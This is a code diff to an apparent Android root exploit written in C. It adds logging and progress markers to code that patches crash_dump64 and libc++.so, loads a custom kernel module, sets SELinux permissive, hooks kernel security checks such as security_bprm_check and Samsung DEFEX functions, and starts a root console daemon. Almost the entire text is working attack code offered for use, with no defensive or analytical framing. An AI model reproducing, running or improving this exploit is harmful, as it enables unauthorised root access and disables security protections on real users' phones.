@@ -17,6 +17,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "aes256.h"
+#include "dflog.h"
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
@@ -337,6 +338,7 @@ static int patch_helper(void) {
         if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
             printf("patch: crash_dump64 verification failed\n");
             printf("patch: DEVICE NOT VULNERABLE\n");
+            dflog("exp", "patch: crash_dump64 read-back mismatch -> DEVICE NOT VULNERABLE");
             free(buf);
             return -1;
         }
@@ -407,9 +409,12 @@ static int patch_ko(void) {
     }
     printf("Using KMI: android%d-%d.%d\n",
              ko->android_release, ko->kver_major, ko->kver_minor);
+    dflog("ko", "device android%d-%d.%d -> KMI android%d-%d.%d", andr, major, minor,
+          ko->android_release, ko->kver_major, ko->kver_minor);
 
     if (libcxx_ko_target[0] == '\0') {
         printf("patch: no KO staging file - cannot deliver the module\n");
+        dflog("ko", "no KO staging file, aborting");
         return -1;
     }
 
@@ -424,6 +429,7 @@ static int patch_ko(void) {
 }
 
 static void cleanup(void) {
+    dflog("exp", "cleanup: enter (libcxx patched=%d)", g_libcxx_r.valid);
     if (!g_libcxx_r.valid) return;
     printf("\n=== cleanup ===\n");
     printf("restoring trampoline in %s\n", g_libcxx_r.lib);
@@ -649,24 +655,28 @@ static int setup(int argc, char **argv) {
                  KO_STAGING_MIN_BYTES / 1024);
     printf("encap port: %d\n", encap_port);
     printf("spi: 0x%x\n", spi);
+    dflog("exp", "setup: ko_target=%s encap=%d sender=%d spi=0x%x probe=%d",
+          ko_target ? ko_target : "(none)", encap_port, sender_port, spi, g_probe);
     return 0;
 }
 
 static int exploit(void) {
     printf("\n=== exploit (patching files) ===\n");
+    dflog("exp", "exploit: start");
 
     int rc = 3;
-    if (patch_helper()) goto done;
-    if (patch_ko()) goto done;
+    if (patch_helper()) { dflog("exp", "exploit: patch_helper failed"); goto done; }
+    if (patch_ko()) { dflog("exp", "exploit: patch_ko failed"); goto done; }
     if (patch_hook("/system/lib64/libc++.so",
                    "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                    libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
-                   &g_libcxx_r)) goto done;
+                   &g_libcxx_r)) { dflog("exp", "exploit: patch_hook failed"); goto done; }
 
     rc = 2;
     usleep(500000);
-    
+
     printf("\n=== init  ===\n");
+    dflog("exp", "exploit: patches applied, triggering hook");
     createOrphanProcess();
 
     static const struct {
@@ -675,7 +685,18 @@ static int exploit(void) {
         int         rc;
     } markers[] = {
         { "/dev/df",    "libc++: mutex acquired, loading custom module", -1 },
+        { "/dev/dfmc",  "bootstrap: root console daemon started",        -1 },
         { "/dev/dfm0",  "dfroot: launching bootstrap",                   -1 },
+        { "/dev/dfms",  "dfroot: SELinux set permissive",                -1 },
+        { "/dev/dfh0",  "dfroot: hooked task_defex_enforce",             -1 },
+        { "/dev/dfh1",  "dfroot: hooked task_defex_user_exec",           -1 },
+        { "/dev/dfh2",  "dfroot: hooked security_inode_permission",      -1 },
+        { "/dev/dfh3",  "dfroot: hooked security_bprm_check",            -1 },
+        { "/dev/dfh4",  "dfroot: hooked security_bprm_creds_for_exec",   -1 },
+        { "/dev/dfh5",  "dfroot: hooked security_bprm_committing_creds", -1 },
+        { "/dev/dfh6",  "dfroot: hooked security_mmap_file",             -1 },
+        { "/dev/dfmrok", "dfroot: bootstrap exited 0",                   -1 },
+        { "/dev/dfmre",  "dfroot: bootstrap failed - see log",           -1 },
         { "/dev/dfme0", "***FAILED***: bootstrap could not read prefs",   1 },
         { "/dev/dfm1",  "bootstrap: prefs loaded",                       -1 },
         { "/dev/dfm7",  "bootstrap: adopting zygote env",                -1 },
@@ -697,20 +718,28 @@ static int exploit(void) {
             if (!seen[j] && access(markers[j].path, F_OK) == 0) {
                 seen[j] = 1;
                 printf("%s\n", markers[j].msg);
+                dflog("mark", "%s", markers[j].msg);
                 if (markers[j].rc >= 0) { rc = markers[j].rc; goto done; }
             }
         }
     }
     printf("***FAILED***: check logs\n");
+    dflog("exp", "exploit: timed out waiting for markers");
 done:
     if (rc == 3) printf("***FAILED***: failed to patch files\n");
+    dflog("exp", "exploit: done rc=%d", rc);
     return rc;
 }
 
 int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
     if (setup(argc, argv) != 0) return 2;
-    if (g_probe) return probe();
+    if (g_probe) {
+        dflog("exp", "probe: start");
+        int r = probe();
+        dflog("exp", "probe: done rc=%d", r);
+        return r;
+    }
     int rc = exploit();
     cleanup();
     return rc;
